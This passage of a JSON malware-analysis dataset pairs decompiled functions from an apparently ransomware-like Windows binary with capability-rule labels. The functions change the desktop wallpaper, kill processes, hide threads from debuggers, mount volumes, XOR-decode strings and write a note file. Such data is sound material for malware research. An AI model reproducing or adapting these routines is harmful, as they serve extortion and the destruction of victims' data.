        "decompiled_code": "\nuint __cdecl fcn.0040c330(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    uVar6 = *(arg_8h + 4);\n    uVar2 = arg_ch & 0x1f;\n    arg_ch = arg_ch >> 5;\n    if ((arg_ch <= uVar6) && ((arg_ch != uVar6 || (uVar2 == 0)))) {\n        if (arg_ch != 0) {\n            uVar3 = 0;\n            if (uVar6 != arg_ch) {\n                iVar5 = arg_ch * 4;\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = *(iVar5 + *(arg_8h + 8));\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                    iVar5 = iVar5 + 4;\n                } while (uVar3 < uVar6 - arg_ch);\n            }\n            if (uVar3 < uVar6) {\n                do {\n                    *(*(arg_8h + 8) + uVar3 * 4) = 0;\n                    uVar3 = uVar3 + 1;\n                    uVar6 = *(arg_8h + 4);\n                } while (uVar3 < uVar6);\n            }\n        }\n        if ((uVar2 != 0) && (uVar6 != 0)) {\n            do {\n                uVar3 = *(*(arg_8h + 8) + -4 + uVar6 * 4);\n                *(*(arg_8h + 8) + uVar6 * 4 + -4) = uVar3 >> uVar2;\n                puVar1 = *(arg_8h + 8) + -4 + uVar6 * 4;\n                *puVar1 = *puVar1 | var_4h;\n                var_4h = uVar3 << (0x20U - uVar2 & 0x1f);\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        return 0;\n    }\n    uVar4 = fcn.0040bbf0(arg_8h, 0);\n    return uVar4;\n}\n",
        "token_count": 572
    },
    "0040fd80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040fd80(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    \n    if (*arg_8h != -1) {\n        (*_sym.imp.ADVAPI32.dll_SetThreadToken)(0, *arg_8h);\n    }\n    fcn.00410170(arg_8h + 1);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 100
    },
    "00411e40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00411e40(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int16_t *piVar4;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    uint uVar7;\n    code *pcVar8;\n    uint uStack1444;\n    uchar *puStack1440;\n    uint uStack1436;\n    uint uStack1428;\n    uchar *arg_ch;\n    uchar *puStack1392;\n    uint uStack1384;\n    uchar uStack1376;\n    uchar uStack1375;\n    uint8_t uStack1374;\n    uint8_t uStack1373;\n    ushort uStack1372;\n    ushort uStack1370;\n    uint8_t uStack1368;\n    uchar uStack1367;\n    uint16_t uStack1366;\n    ushort uStack1364;\n    ushort uStack1362;\n    uchar uStack1360;\n    uchar uStack1359;\n    ushort uStack1358;\n    ushort uStack1356;\n    ushort uStack1354;\n    uint32_t uStack1352;\n    int16_t *piStack1348;\n    int32_t iStack1344;\n    uint uStack1340;\n    uchar *puStack1336;\n    int32_t iStack1332;\n    uint uStack1328;\n    uint uStack1324;\n    uchar *puStack1320;\n    uint uStack1316;\n    uchar auStack1300 [4];\n    uint uStack1296;\n    int32_t iStack1284;\n    int32_t iStack1280;\n    float fStack1276;\n    float fStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uchar auStack1260 [4];\n    uchar auStack1256 [4];\n    uint uStack1252;\n    uint uStack1244;\n    uint uStack1200;\n    uint uStack1184;\n    uint uStack1180;\n    float fStack1176;\n    float fStack1172;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uchar auStack728 [8];\n    uchar auStack720 [716];\n    \n    uStack1316 = 0;\n    puStack1320 = &stack0xfffffb9c;\n    uStack1324 = &stack0xfffffb24;\n    uStack1124 = 1;\n    uStack1120 = 0;\n    uStack1116 = 0;\n    uStack1112 = 0;\n    uStack1328 = 0x411e98;\n    uStack1252 = param_2;\n    iVar1 = (*_sym.imp.gdiplus.dll_GdiplusStartup)();\n    pcVar8 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar1 < 0) {\n        return 0;\n    }\n    uStack1328 = 0x10;\n    iStack1332 = 0x411eaa;\n    iVar1 = (*_sym.imp.USER32.dll_GetSystemMetrics)();\n    iStack1332 = 0x11;\n    puStack1336 = 0x411eb4;\n    fStack1272 = iVar1;\n    iVar2 = (*pcVar8)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (iVar2 == 0) {\n        return 0;\n    }\n    puStack1336 = &stack0xfffffb24;\n    uStack1244 = 0;\n    uStack1340 = 0;\n    iStack1344 = 0x26200a;\n    piStack1348 = NULL;\n    uStack1356 = iVar1;\n    uStack1354 = iVar1 >> 0x10;\n    uStack1360 = 0xe4;\n    uStack1359 = 0x1e;\n    uStack1358 = 0x41;\n    uStack1352 = iVar2;\n    (*_sym.imp.gdiplus.dll_GdipCreateBitmapFromScan0)();\n    uStack1360 = SUB41(&stack0xfffffacc, 0);\n    uStack1359 = &stack0xfffffacc >> 8;\n    uStack1358 = &stack0xfffffacc >> 0x10;\n    uStack1364 = uStack1268;\n    uStack1362 = uStack1268 >> 0x10;\n    uStack1264 = uStack1268;\n    iStack1332 = 0;\n    uStack1368 = 0;\n    uStack1367 = 0x1f;\n    uStack1366 = 0x41;\n    uStack1264 = (*_sym.imp.gdiplus.dll_GdipGetImageGraphicsContext)();\n    uStack1368 = uStack1296;\n    uStack1367 = uStack1296 >> 8;\n    uStack1366 = uStack1296 >> 0x10;\n    uStack1372 = extraout_ECX;\n    uStack1370 = extraout_ECX >> 0x10;\n    uStack1268 = uStack1340;\n    uStack1376 = 0x1d;\n    uStack1375 = 0x1f;\n    uStack1374 = 0x41;\n    uStack1373 = 0;\n    puVar3 = fcn.004014d0();\n    iStack1284 = 0xb;\n    piVar6 = puVar3 + 2;\n    piVar4 = piVar6;\n    do {\n        *piVar4 = *puVar3 ^ *piVar4;\n        iStack1284 = iStack1284 + -1;\n        piVar4 = piVar4 + 1;\n    } while (iStack1284 != 0);\n    *(puVar3 + 0x18) = 0;\n    puStack1392 = 0x411f66;\n    piStack1348 = piVar6;\n    fcn.00401210(piVar6);\n    uStack1184 = 0x42480000;\n    uStack1180 = 0x42480000;\n    fStack1176 = iStack1332 + -100;\n    puStack1392 = &stack0xfffffac0;\n    fStack1172 = iVar2 + -0x32;\n    fStack1276 = iStack1332;\n    fStack1272 = iVar2;\n    iStack1344 = iStack1284;\n    iStack1280 = iStack1284;\n    uStack1352 = (*_sym.imp.gdiplus.dll_GdipCreateStringFormat)();\n    iVar1 = (*_sym.imp.gdiplus.dll_GdipSetStringFormatAlign)();\n    if (iVar1 != 0) {\n        uStack1360 = iVar1;\n        uStack1359 = iVar1 >> 8;\n        uStack1358 = iVar1 >> 0x10;\n        if (-1 < iVar1) goto code_r0x00411ff6;\ncode_r0x0041200c:\n        uVar7 = 0;\n        goto code_r0x00412151;\n    }\ncode_r0x00411ff6:\n    iVar1 = (*_sym.imp.gdiplus.dll_GdipSetStringFormatLineAlign)();\n    if (iVar1 != 0) {\n        uStack1360 = iVar1;\n        uStack1359 = iVar1 >> 8;\n        uStack1358 = iVar1 >> 0x10;\n        if (iVar1 < 0) goto code_r0x0041200c;\n    }\n    uStack1352 = 0xffffebcd;\n    arg_ch = &stack0xfffffa98;\n    uStack1384 = 0xff000000;\n    uStack1428 = 0x412040;\n    fcn.00401160(&stack0xfffffae8, arg_ch, &stack0xfffffab8, 2);\n    puStack1440 = puStack1320;\n    uStack1436 = uStack1316;\n    uStack1444 = uStack1200;\n    piVar4 = (*_sym.imp.gdiplus.dll_GdipFillRectangle)();\n    if (((piVar4 == NULL) || (piStack1348 = piVar4,  -1 < piVar4)) &&\n       (iVar1 = (*_sym.imp.msvcrt.dll_malloc)(),  iVar1 != 0)) {\n        uStack1368 = *0x41da5a ^ 0x30;\n        uStack1376 = 0x30;\n        uStack1375 = 0;\n        uStack1374 = 0x15;\n        uStack1373 = 0;\n        uStack1367 = *0x41da5a >> 8;\n        uStack1366 = str.image_bmp._0_4_ ^ 0x30;\n        uStack1372 = 99;\n        uStack1370 = 0x30;\n        uStack1364 = 0;\n        fcn.00401320();\n        (*_sym.imp.USER32.dll_wsprintfW)();\n        uStack1384 = 0xffffd700;\n        uVar7 = 0;\n        fcn.00401160(&stack0xfffffac0, &stack0xfffffa94, &stack0xfffffa98, 0);\n        iVar2 = fcn.004011b0(iVar1, piVar6, &stack0xfffffaec, &stack0xfffffb14, &stack0xfffffa74, &stack0xfffffa90);\n        if (iVar2 < 0) {\n            (*_sym.imp.msvcrt.dll_free)(iVar1);\ncode_r0x00412136:\n            uVar7 = 0;\n        }\n        else {\n            piVar4 = fcn.00401540(extraout_ECX_00, arg_ch);\n            iVar1 = 0x13;\n            piVar6 = piVar4;\n            do {\n                piVar6 = piVar6 + 1;\n                *piVar6 = *piVar6 ^ *piVar4;\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != 0);\n            piVar4[0x14] = 0;\n            iVar1 = fcn.004123d0();\n            if (iVar1 == -1) goto code_r0x00412136;\n            (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x104, &stack0xfffffd30);\n            (*_sym.imp.KERNEL32.dll_GetTempFileNameW)(&stack0xfffffd28, 0, 0, &stack0xfffffb18);\n            puVar3 = fcn.004015f0(extraout_ECX_01, uVar7);\n            iVar1 = 0xd;\n            piVar6 = puVar3 + 2;\n            do {\n                *piVar6 = *piVar6 ^ *puVar3;\n                iVar1 = iVar1 + -1;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            *(puVar3 + 0x1c) = 0;\n            (*_sym.imp.USER32.dll_wsprintfW)(&stack0xfffffb00, puVar3 + 2, &stack0xfffffb00);\n            iVar1 = (*_sym.imp.gdiplus.dll_GdipSaveImageToFile)(uStack1436, &stack0xfffffb00, &stack0xfffffaf0, 0);\n            if ((iVar1 != 0) && (iVar1 < 0)) goto code_r0x00412136;\n            uVar5 = 0;\n            uStack1324 = *0x423b40;\n            puStack1320 = *0x423b44;\n            uStack1316 = *0x423b48;\n            do {\n                (&stack0xfffffad5)[uVar5] = (&stack0xfffffad5)[uVar5] ^ *0x423b40;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0xe);\n            uVar5 = 0;\n            do {\n                (&stack0xfffffa46)[uVar5] = (&stack0xfffffa46)[uVar5] ^ 7;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0xd);\n            uVar5 = 0;\n            uStack1374 = *0x423c80;\n            uStack1373 = *0x423c80 >> 8;\n            uStack1372 = *0x423c80 >> 0x10;\n            uStack1370 = *0x423c84;\n            uStack1368 = *0x423c84 >> 0x10;\n            uStack1367 = *0x423c84 >> 0x18;\n            uStack1366 = *0x423c88;\n            uStack1364 = *0x423c88 >> 0x10;\n            uStack1362 = *0x423c8c;\n            uStack1360 = *0x423c8c >> 0x10;\n            uStack1359 = *0x423c8c >> 0x18;\n            uStack1358 = 0x1204;\n            uStack1356 = 0x150a;\n            uStack1354 = 0x110e;\n            do {\n                (&stack0xfffffaa3)[uVar5] = (&stack0xfffffaa3)[uVar5] ^ uStack1374;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x15);\n            uStack1352 = uStack1352 & 0xffffff00;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000001, &stack0xfffffaa3, &stack0xfffffa5c);\n            if (iVar1 != 0) goto code_r0x00412136;\n            iVar1 = fcn.00412570();\n            pcVar8 = _sym.imp.ADVAPI32.dll_RegSetValueExA;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)\n                              (uStack1444, &stack0xfffffad5, 0, 1, &stack0xfffffa38, iVar1 + 1);\n            if (iVar1 != 0) goto code_r0x00412136;\n            iVar1 = fcn.00412570();\n            iVar1 = (*pcVar8)(uStack1444, &stack0xfffffa46, 0, 1, &stack0xfffffa3c, iVar1 + 1);\n            if (iVar1 != 0) goto code_r0x00412136;\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(uStack1444);\n            (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x14, 0, &stack0xfffffb1c, 3);\n            uVar7 = 1;\n        }\n        pcVar8 = _sym.imp.gdiplus.dll_GdipDeleteBrush;\n        (*_sym.imp.gdiplus.dll_GdipDeleteBrush)(arg_ch);\n    }\n    else {\n        uVar7 = 0;\n        pcVar8 = _sym.imp.gdiplus.dll_GdipDeleteBrush;\n    }\n    (*pcVar8)();\ncode_r0x00412151:\n    (*_sym.imp.gdiplus.dll_GdipDeleteStringFormat)();\n    (*_sym.imp.gdiplus.dll_GdipDeleteFont)();\n    (*_sym.imp.gdiplus.dll_GdipDeleteGraphics)();\n    uStack1428 = 0x412179;\n    (*_sym.imp.gdiplus.dll_GdipDisposeImage)();\n    return uVar7;\n}\n",
        "token_count": 3481
    },
    "00412510": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00412510(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    var_4h = param_1;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, param_1, param_2, 0, &var_4h);\n    if (iVar1 != -1) {\n        (*_sym.imp.ntdll.dll_NtSetInformationThread)(iVar1, 0x11, 0, 0);\n    }\n    return iVar1;\n}\n",
        "token_count": 131
    },
    "00416710": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00416710(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_130h;\n    int32_t var_118h;\n    int32_t var_4h;\n    \n    var_4h = param_1;\n    fcn.004124f0(&var_130h, 0, 0x128);\n    var_130h = 0x128;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n    if (iVar2 != -1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_Process32First)(iVar2, &var_130h);\n        while (iVar3 != 0) {\n            if (((var_118h == param_1) && (iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)(),  var_118h != iVar3))\n               && (iVar3 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 1, var_118h),  param_1 = var_4h,  iVar3 != 0))\n            {\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar3, 1);\n                (*pcVar1)(iVar3);\n                param_1 = var_4h;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32Next)(iVar2, &var_130h);\n        }\n        (*pcVar1)(iVar2);\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    if ((param_1 != iVar2) && (iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 1, param_1),  iVar2 != 0)) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar2, 1);\n        (*pcVar1)(iVar2);\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 477
    },
    "00417400": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00417400(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint lpszVolumeMountPoint;\n    uint var_25h;\n    uint uStack37;\n    uint uStack33;\n    uint uStack29;\n    uint var_15h;\n    uint var_11h;\n    uchar var_dh;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = _sym.imp.USER32.dll_wsprintfW;\n    var_4h._0_2_ = 0;\n    var_ch = 0x430025;\n    var_8h = 0x5c003a;\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszVolumeMountPoint, &var_ch, 0x5a);\n    iVar4 = (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)(&lpszVolumeMountPoint, param_1);\n    iVar2 = 0x19;\n    while( true ) {\n        if (iVar4 != 0) {\n            uVar5 = 0;\n            uStack37 = *0x423ef4;\n            uStack33 = *0x423ef8;\n            uStack29 = *0x423efc;\n            var_15h = 0x73276362;\n            var_11h = 0x54222768;\n            do {\n                var_25h._0_1_ = *0x423ef0;\n                puVar1 = &var_25h + uVar5 + 1;\n                *puVar1 = *puVar1 ^ var_25h;\n                uVar5 = uVar5 + 1;\n            } while (uVar5 < 0x17);\n            var_dh = 0;\n            var_25h = *0x423ef0;\n            fcn.0040f630(&var_25h + 1, param_1);\n            return;\n        }\n        if (iVar2 + -1 == -1) break;\n        var_ch = 0x430025;\n        var_4h._0_2_ = 0;\n        var_8h = 0x5c003a;\n        (*pcVar3)(&lpszVolumeMountPoint, &var_ch, iVar2 + 0x40);\n        iVar4 = (*_sym.imp.KERNEL32.dll_SetVolumeMountPointW)(&lpszVolumeMountPoint, param_1);\n        iVar2 = iVar2 + -1;\n    }\n    return;\n}\n",
        "token_count": 592
    },
    "00417f20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00417f20(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uchar (*pauVar5) [16];\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    int32_t in_FS_OFFSET;\n    uint pszPath;\n    uint var_34h;\n    uint var_2ch;\n    uint var_23h;\n    uint uStack35;\n    uint uStack31;\n    uint uStack27;\n    uint var_13h;\n    uint var_fh;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.004124f0(&pszPath, 0, 0x208);\n    puVar8 = &pszPath;\n    for (iVar6 = 0x82; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = *param_1;\n        param_1 = param_1 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecW)(&pszPath);\n    uVar7 = 0;\n    var_23h = *0x423cb0;\n    uStack35 = *0x423cb4;\n    uStack31 = *0x423cb8;\n    uStack27 = *0x423cbc;\n    var_13h = 0x316b3620;\n    var_fh._0_2_ = 0x313d;\n    do {\n        puVar1 = &var_23h + uVar7 + 1;\n        *puVar1 = *puVar1 ^ *0x423cb0;\n        uVar7 = uVar7 + 1;\n    } while (uVar7 < 0x15);\n    var_fh._2_1_ = 0;\n    var_4h._0_2_ = 0;\n    stack0xfffffff0 = 0x730025;\n    var_8h = 0x530025;\n    (*_sym.imp.USER32.dll_wsprintfW)(&pszPath, &var_fh + 3, &pszPath, &var_23h + 1);\n    iVar6 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&pszPath, 0x40000000, 0, 0, 1, 0x50000000, 0);\n    if (iVar6 != -1) {\n        var_2ch = *0x428228;\n        iVar4 = (*_sym.imp.ntdll.dll_NtSetInformationFile)(iVar6, &var_34h, &var_2ch, 8, 0x1e);\n        if (iVar4 == 0) {\n            pauVar5 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, 0x40068);\n            uVar3 = *0x428428;\n            uVar2 = *0x4281a4;\n            if (pauVar5 != NULL) {\n                *pauVar5 = ZEXT816(0);\n                *pauVar5[1] = 0;\n                *(pauVar5[2] + 4) = 3;\n                *(*pauVar5 + 8) = 0;\n                *(*pauVar5 + 0xc) = 0;\n                *pauVar5[1] = 0;\n                *pauVar5[2] = iVar6;\n                iVar4 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar6, uVar2, uVar3, 0, pauVar5);\n                if ((iVar4 != 0) || (*(in_FS_OFFSET + 0x34) == 0x3e5)) {\n                    return 1;\n                }\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(pauVar5);\n            }\n            (*_sym.imp.ntdll.dll_NtClose)(iVar6);\n            return 0;\n        }\n        (*_sym.imp.ntdll.dll_NtClose)(iVar6);\n        (*_sym.imp.USER32.dll_MessageBoxA)(0, \"Unable to bind NOTE file IOCP %S error: %d\", 0, 0);\n    }\n    return 0;\n}\n",
        "token_count": 963
    },
    "0041a330": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041a330(uint param_1, uint param_2)\n\n{\n    uint16_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_230h;\n    int32_t var_22ch;\n    uint ARG_1;\n    int32_t var_124h;\n    ushort name;\n    int32_t var_1ah;\n    uint var_12h;\n    uint var_eh;\n    uint var_8h;\n    uint argp;\n    \n    var_12h = 0;\n    _var_1ah = 0;\n    var_eh._0_2_ = 0;\n    name = 2;\n    uVar2 = (*_sym.imp.WS2_32.dll_inet_addr)(param_1);\n    _var_1ah = CONCAT42(uVar2, var_1ah);\n    _var_1ah = _var_1ah & 0xffff000000000000 | _var_1ah;\n    uVar1 = (*_sym.imp.WS2_32.dll_htons)(param_2);\n    _var_1ah = _var_1ah & 0xffffffffffff0000 | uVar1;\n    if ((stack0xffffffe4 != -1) && (iVar3 = (*_sym.imp.WS2_32.dll_socket)(2, 1, 6),  iVar3 != -1)) {\n        argp = 1;\n        iVar4 = (*_sym.imp.WS2_32.dll_ioctlsocket)(iVar3, 0x8004667e, &argp);\n        if (iVar4 != -1) {\n            iVar4 = (*_sym.imp.WS2_32.dll_connect)(iVar3, &name, 0x10);\n            if (iVar4 != -1) {\ncode_r0x0041a440:\n                (*_sym.imp.WS2_32.dll_closesocket)(iVar3);\n                return 1;\n            }\n            iVar4 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            if (iVar4 == 0x2733) {\n                var_230h = 1;\n                ARG_1 = 1;\n                stack0xfffffff0 = 5;\n                var_8h = 0;\n                var_22ch = iVar3;\n                var_124h = iVar3;\n                iVar4 = (*_sym.imp.WS2_32.dll_select)(0, 0, &var_230h, &ARG_1, &var_eh + 2);\n                if (0 < iVar4) {\n                    iVar4 = (*_sym.imp.WS2_32.dll___WSAFDIsSet)(iVar3, &ARG_1);\n                    if (iVar4 != 0) {\n                        return 0;\n                    }\n                    goto code_r0x0041a440;\n                }\n            }\n        }\n        (*_sym.imp.WS2_32.dll_closesocket)(iVar3);\n    }\n    return 0;\n}\n",
        "token_count": 671
    },
    "0040acd0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040acd0(uint *arg_8h, uint32_t arg_ch, code *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_ch & 3) != 0) + (arg_ch >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004124d0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.0040bbf0(arg_8h, 0);\n    if (iVar1 == 0) {\n        (*arg_10h)(arg_14h, arg_8h[2] + (arg_ch_00 * 4 - arg_ch), arg_ch);\n        fcn.0040c6a0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 480
    },
    "0040c0e0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040c0e0(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = ((arg_10h & 3) != 0) + (arg_10h >> 2);\n    if (arg_8h[1] != arg_ch_00) {\n        if (arg_8h[2] != 0) {\n            fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n            sub.msvcrt.dll_free(arg_8h[2]);\n        }\n        *arg_8h = 1;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        if (10000 < arg_ch_00) {\n            return -0x10;\n        }\n        if (arg_ch_00 != 0) {\n            iVar1 = sub.msvcrt.dll_calloc(arg_ch_00, 4);\n            if (iVar1 == 0) {\n                return -0x10;\n            }\n            if (arg_8h[2] != 0) {\n                fcn.004124d0(iVar1, arg_8h[2], arg_8h[1] << 2);\n                fcn.0040eda0(arg_8h[2], arg_8h[1] << 2);\n                sub.msvcrt.dll_free(arg_8h[2]);\n            }\n            arg_8h[1] = arg_ch_00;\n            arg_8h[2] = iVar1;\n        }\n    }\n    iVar1 = fcn.0040bbf0(arg_8h, 0);\n    if ((iVar1 == 0) && (arg_ch != 0)) {\n        fcn.004124d0(arg_8h[2] + (arg_ch_00 * 4 - arg_10h), arg_ch, arg_10h);\n        fcn.0040c6a0(arg_8h[2], arg_ch_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 492
    },
    "0040c5f0": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c5f0(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    uint var_4h;\n    \n    iVar1 = *(arg_8h + 4);\n    uVar2 = iVar1 * 4;\n    if (uVar2 < arg_10h) {\n        iVar4 = arg_ch + iVar1 * -4 + arg_10h;\n        fcn.004124f0(arg_ch, 0, arg_10h + iVar1 * -4);\n        arg_10h = uVar2;\n        arg_ch = iVar4;\n    }\n    else if (arg_10h < uVar2) {\n        uVar3 = arg_10h;\n        do {\n            if (*(*(arg_8h + 8) + (uVar3 & 0xfffffffc)) >> ((uVar3 & 3) << 3) != '\\0') {\n                return 0xfffffff8;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < uVar2);\n    }\n    if (arg_10h != 0) {\n        uVar2 = 0;\n        puVar5 = arg_ch + -1 + arg_10h;\n        do {\n            uVar3 = uVar2 + 1;\n            *puVar5 = *(*(arg_8h + 8) + (uVar2 & 0xfffffffc)) >> ((uVar2 & 3) << 3);\n            uVar2 = uVar3;\n            puVar5 = puVar5 + -1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 417
    },
    "0041a570": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041a570(uint noname_0, uint *arg_ch)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    int16_t *piVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    ulong uVar10;\n    uint pszName;\n    uint var_9eh;\n    uint pBindOptions;\n    uint var_14h;\n    uint ppv;\n    \n    ppv = 0;\n    iVar2 = fcn.00412550();\n    if (0x40 < iVar2) {\n        *arg_ch = 0;\n        return 0x80004005;\n    }\n    iVar2 = 0x24;\n    puVar3 = &pBindOptions;\n    do {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    pBindOptions = 0x24;\n    var_14h = 4;\n    uVar10 = fcn.00407040(0, arg_ch);\n    puVar3 = uVar10 >> 0x20;\n    puVar4 = uVar10;\n    iVar2 = 0x13;\n    piVar5 = puVar4 + 4;\n    do {\n        piVar5[-1] = *(piVar5 + -1) ^ *puVar4;\n        *piVar5 = *piVar5 ^ *puVar4;\n        piVar5[1] = *puVar4 ^ *(piVar5 + 1);\n        iVar2 = iVar2 + -1;\n        piVar5 = piVar5 + 3;\n    } while (iVar2 != 0);\n    piVar5 = puVar4 + 2;\n    *(puVar4 + 0x74) = 0;\n    iVar2 = -piVar5;\n    do {\n        iVar1 = *piVar5;\n        piVar5 = piVar5 + 1;\n        *(&stack0xfffffd52 + iVar2 + 